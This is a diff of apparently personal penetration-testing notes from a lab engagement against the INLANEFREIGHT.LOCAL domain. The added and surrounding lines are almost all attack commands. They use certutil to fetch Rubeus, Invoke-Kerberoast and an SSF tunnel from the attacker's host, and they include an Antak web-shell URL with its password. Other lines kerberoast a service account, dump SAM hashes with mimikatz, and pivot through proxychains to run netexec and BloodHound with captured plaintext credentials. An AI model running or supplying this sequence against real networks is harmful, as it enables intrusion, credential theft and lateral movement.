@@ -1,12 +1,16 @@
 http://10.129.202.242/uploads/antak.aspx
 admin:My_W3bsH3ll_P@ssw0rd!
 
+certutil.exe -urlcache -f http://10.10.14.135/Invoke-Kerberoast.ps1 Invoke-Kerberoast.ps1
+certutil.exe -urlcache -f http://10.10.14.135/Rubeus.exe Rubeus.exe
 
+certutil.exe -urlcache -f http://10.10.14.135/ssf-win-x86_64-3.0.0.zip ssf-win-x86_64-3.0.0.zip
+Expand-Archive -path C:\users\administrator\desktop\ssf-win-x86_64-3.0.0.zip
 
 
 .\Rubeus.exe kerberoast /nowrap
 svc_sql:lucky7
-certutil.exe -urlcache -f http://10.10.14.242:8000/mimikatz64_21.exe mimikatz64_21.exe
+certutil.exe -urlcache -f http://10.10.14.135/Invoke-Kerberoast.ps1 Invoke-Kerberoast.ps1
 
 
 ./mimikatz64_22.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > file.txt
@@ -31,3 +35,8 @@ proxychains4 -q netexec smb 172.16.6.3 -u "tpetty" -p "Sup3rS3cur3D0m@inU2eR" --
 Expand-Archive -path C:\users\administrator\desktop\ssf-win-x86_64-3.0.0.zip
 PS C:\users\administrator\desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0> .\ssfd.exe -p 1234
 ./ssf -D 1111 -p 1234 10.129.202.242
+
+
+
+proxychains4 -q bloodhound-python -c ALL --zip -u "svc_sql" -p "lucky7" -d "INLANEFREIGHT.LOCAL" -dc DC01.INLANEFREIGHT.LOCAL -ns 172.16.6.3 --dns-tcp
+└─# echo "172.16.6.3      DC01.INLANEFREIGHT.LOCAL" >> /etc/hosts
